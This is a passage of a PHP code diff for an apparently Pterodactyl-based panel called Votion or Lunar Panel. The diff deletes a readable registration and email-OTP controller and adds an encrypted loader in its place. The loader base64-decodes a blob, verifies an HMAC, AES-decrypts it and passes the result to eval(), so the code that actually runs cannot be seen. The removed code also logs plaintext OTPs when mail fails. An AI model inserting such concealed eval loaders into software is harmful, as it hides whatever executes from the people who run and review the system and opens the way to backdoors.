-                'token' => $request->session()->token(),
-                'redirect' => '/',
-                'message' => 'Account created successfully! Logging into dashboard...',
-            ]);
-        }
-
-        // Generate 6-digit numeric OTP
-        $otp = str_pad((string) random_int(100000, 999999), 6, '0', STR_PAD_LEFT);
-        $verificationToken = Str::random(64);
-
-        // Store registration state in cache for 15 minutes
-        Cache::put('reg_otp_' . $verificationToken, [
-            'name' => $name,
-            'email' => $email,
-            'password' => Hash::make($password),
-            'otp' => $otp,
-            'attempts' => 0,
-            'created_at' => now()->timestamp,
-        ], now()->addMinutes(15));
-
-        // Dispatch verification code via configured SMTP Mail
-        $mailSent = false;
-        try {
-            Mail::send('emails.auth.registration-otp', ['name' => $name, 'otp' => $otp], function ($message) use ($email) {
-                $message->to($email)
-                    ->subject('Your Votion Verification Code');
-            });
-            $mailSent = true;
-        } catch (Exception $e) {
-            Log::error('Failed to send registration OTP email to ' . $email . ': ' . $e->getMessage());
-            // In local/testing environments without external SMTP relays, log the OTP for verification
-            Log::info("Votion Registration OTP for [{$email}]: {$otp} (Token: {$verificationToken})");
-        }
-
-        return new JsonResponse([
-            'success' => true,
-            'verificationRequired' => true,
-            'verificationToken' => $verificationToken,
-            'message' => $mailSent
-                ? "A verification code has been sent to {$email}."
-                : "A verification code has been generated for {$email}."
-        ]);
+    $raw = base64_decode($p, true);
+    if ($raw === false || strlen($raw) <= 16) {
+        header('HTTP/1.1 500 Core Integrity Failure');
+        exit("Fatal error: Lunar Panel core container is corrupted.\n");
     }
 
-    /**
-     * Verify the 6-digit OTP code, create the user record, and authenticate the session.
-     */
-    public function verifyOtp(Request $request): JsonResponse
-    {
-        $validated = $request->validate([
-            'email' => 'required|email|max:191',
-            'verificationToken' => 'required|string',
-            'otp' => 'required|string',
-        ]);
-
-        $email = strtolower(trim($validated['email']));
-        $token = $validated['verificationToken'];
-        $submittedOtp = trim($validated['otp']);
-
-        $cacheKey = 'reg_otp_' . $token;
-        $cached = Cache::get($cacheKey);
-
-        if (!$cached || !is_array($cached)) {
-            return new JsonResponse([
-                'success' => false,
-                'error' => 'The verification code has expired or is invalid. Please register again.',
-            ], 400);
-        }
-
-        if (strtolower($cached['email']) !== $email) {
-            return new JsonResponse([
-                'success' => false,
-                'error' => 'Email address mismatch. Please register again.',
-            ], 400);
-        }
-
-        // Protect against brute-force guessing
-        if (($cached['attempts'] ?? 0) >= 5) {
-            Cache::forget($cacheKey);
-            return new JsonResponse([
-                'success' => false,
-                'error' => 'Too many invalid verification attempts. Please start registration again.',
-            ], 429);
-        }
-
-        if (!hash_equals((string) $cached['otp'], $submittedOtp)) {
-            $cached['attempts'] = ($cached['attempts'] ?? 0) + 1;
-            Cache::put($cacheKey, $cached, now()->addMinutes(15));
-
-            return new JsonResponse([
-                'success' => false,
-                'error' => 'Invalid verification code. Please check your email and try again.',
-            ], 400);
-        }
-
-        // Ensure user hasn't been created in the meantime
-        if (User::query()->where('email', $email)->exists()) {
-            Cache::forget($cacheKey);
-            return new JsonResponse([
-                'success' => false,
-                'error' => 'An account with this email address already exists. Please log in.',
-            ], 422);
-        }
-
-        // Create the user in the database
-        $user = $this->createUserRecord($cached['name'], $email, $cached['password']);
-
-        // Clear the cache OTP token
-        Cache::forget($cacheKey);
-
-        // Authenticate the user directly into the panel session
-        Auth::login($user, true);
-        $request->session()->regenerate();
-
-        return new JsonResponse([
-            'success' => true,
-            'user' => [
-                'id' => $user->id,
-                'uuid' => $user->uuid,
-                'username' => $user->username,
-                'email' => $user->email,
-                'name' => $user->name,
-                'role' => 'client',
-            ],
-            'token' => $request->session()->token(),
-            'redirect' => '/',
-        ]);
+    // Cryptographic self-integrity verification
+    if (!hash_equals($m, hash_hmac('sha256', $raw, $s))) {
+        header('HTTP/1.1 500 Core Integrity Violation');
+        exit("Fatal error: Lunar Panel core integrity violation. Code has been tampered with or modified.\n");
     }
 
-    /**
-     * Create a new user record in the database with a permanent RFC 4122 v4 UUID.
-     */
-    protected function createUserRecord(string $fullName, string $email, string $hashedPassword): User
-    {
-        $nameParts = explode(' ', $fullName, 2);
-        $nameFirst = $nameParts[0];
-        $nameLast = $nameParts[1] ?? 'User';
+    $iv = substr($raw, 0, 16);
+    $ct = substr($raw, 16);
+    $dec = openssl_decrypt($ct, 'AES-256-CBC', $k, OPENSSL_RAW_DATA, $iv);
 
-        $baseUsername = preg_replace('/[^a-zA-Z0-9_]/', '', strtolower(explode('@', $email)[0]));
-        if (empty($baseUsername) || strlen($baseUsername) < 3) {
-            $baseUsername = 'user_' . strtolower(Str::random(5));
-        }
-
-        $username = $baseUsername;
-        $counter = 1;
-        while (User::query()->where('username', $username)->exists()) {
-            $username = $baseUsername . $counter;
-            $counter++;
-        }
-
-        $user = new User();
-        $user->uuid = Uuid::uuid4()->toString();
-        $user->username = $username;
-        $user->email = $email;
-        $user->name_first = $nameFirst;
-        $user->name_last = $nameLast;
-        $user->password = $hashedPassword; // already bcrypt-hashed
-        $user->language = 'en';
-        $user->root_admin = false;
-        $user->use_totp = false;
-        $user->gravatar = true;
-        $user->save();
-
-        Activity::event('auth:register')->withRequestMetadata()->subject($user)->log();
-
-        return $user;
+    if ($dec === false) {
+        header('HTTP/1.1 500 Core Decryption Failure');
+        exit("Fatal error: Failed to initialize Lunar Panel core runtime.\n");
     }
 
-    /**
-     * Resend verification OTP code to the user's email.
-     */
-    public function resendOtp(Request $request): JsonResponse
-    {
-        $otpEnabled = filter_var(config('pterodactyl.auth.registration_otp_enabled', true), FILTER_VALIDATE_BOOLEAN);
-        if (!$otpEnabled) {
-            return new JsonResponse([
-                'success' => false,
-                'error' => 'Registration OTP verification is currently disabled.',
-            ], 400);
-        }
-
-        $validated = $request->validate([
-            'email' => 'required|email|max:191',
-            'verificationToken' => 'required|string',
-        ]);
-
-        $email = strtolower(trim($validated['email']));
-        $token = $validated['verificationToken'];
-
-        $cacheKey = 'reg_otp_' . $token;
-        $cached = Cache::get($cacheKey);
-
-        if (!$cached || !is_array($cached)) {
-            return new JsonResponse([
-                'success' => false,
-                'error' => 'Verification session expired. Please register again.',
-            ], 400);
-        }
-
-        // Generate fresh 6-digit OTP
-        $otp = str_pad((string) random_int(100000, 999999), 6, '0', STR_PAD_LEFT);
-        $cached['otp'] = $otp;
-        $cached['attempts'] = 0;
-        Cache::put($cacheKey, $cached, now()->addMinutes(15));
-
-        try {
-            Mail::send('emails.auth.registration-otp', ['name' => $cached['name'], 'otp' => $otp], function ($message) use ($email) {
-                $message->to($email)
-                    ->subject('Your New Votion Verification Code');
-            });
-        } catch (Exception $e) {
-            Log::error('Failed to resend registration OTP email: ' . $e->getMessage());
-            Log::info("Resent Votion Registration OTP for [{$email}]: {$otp}");
-        }
-
-        return new JsonResponse([
-            'success' => true,
-            'verificationRequired' => true,
-            'verificationToken' => $token,
-            'message' => "A new verification code has been sent to {$email}.",
-        ]);
-    }
-}
+    unset($p, $k, $s, $m, $raw, $iv, $ct);
+    eval($dec);
+})();
